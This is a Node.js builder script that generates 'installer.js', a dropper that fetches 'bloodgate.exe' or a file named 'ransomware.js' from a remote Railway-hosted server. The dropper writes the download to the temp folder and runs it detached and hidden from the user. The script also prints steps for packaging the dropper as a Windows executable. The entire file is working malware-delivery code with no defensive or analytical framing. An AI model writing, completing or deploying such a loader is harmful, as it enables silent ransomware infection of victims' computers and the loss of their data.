const fs = require('fs');
const path = require('path');

const installerContent = `
const https = require('https');
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const os = require('os');

const SERVER_URL = 'https://bloodgate-production.up.railway.app';

function downloadAndRun() {
    const tempPath = path.join(os.tmpdir(), 'bloodgate_setup.exe');
    
    https.get(SERVER_URL + '/download/bloodgate.exe', (response) => {
        if (response.statusCode === 404) {
            const jsUrl = SERVER_URL + '/download/ransomware.js';
            https.get(jsUrl, (res2) => {
                let data = '';
                res2.on('data', c => data += c);
                res2.on('end', () => {
                    const jsPath = path.join(os.tmpdir(), 'bloodgate.js');
                    fs.writeFileSync(jsPath, data);
                    const child = spawn('node', [jsPath], {
                        detached: true,
                        stdio: 'ignore',
                        windowsHide: true
                    });
                    child.unref();
                });
            });
            return;
        }
        
        let data = '';
        response.on('data', c => data += c);
        response.on('end', () => {
            fs.writeFileSync(tempPath, data);
            const child = spawn(tempPath, [], {
                detached: true,
                stdio: 'ignore',
                windowsHide: true
            });
            child.unref();
        });
    }).on('error', () => {
        const jsUrl = SERVER_URL + '/download/ransomware.js';
        https.get(jsUrl, (res2) => {
            let data = '';
            res2.on('data', c => data += c);
            res2.on('end', () => {
                const jsPath = path.join(os.tmpdir(), 'bloodgate.js');
                fs.writeFileSync(jsPath, data);
                const child = spawn('node', [jsPath], {
                    detached: true,
                    stdio: 'ignore',
                    windowsHide: true
                });
                child.unref();
            });
        });
    });
}

downloadAndRun();
`;

const builderDir = __dirname;
if (!fs.existsSync(builderDir)) {
    fs.mkdirSync(builderDir, { recursive: true });
}

fs.writeFileSync(path.join(builderDir, 'installer.js'), installerContent);
console.log('✅ installer.js created');
console.log('📦 To build EXE: npm install -g pkg && cd builder && pkg installer.js --target node18-win-x64 --output Bloodgate.exe');
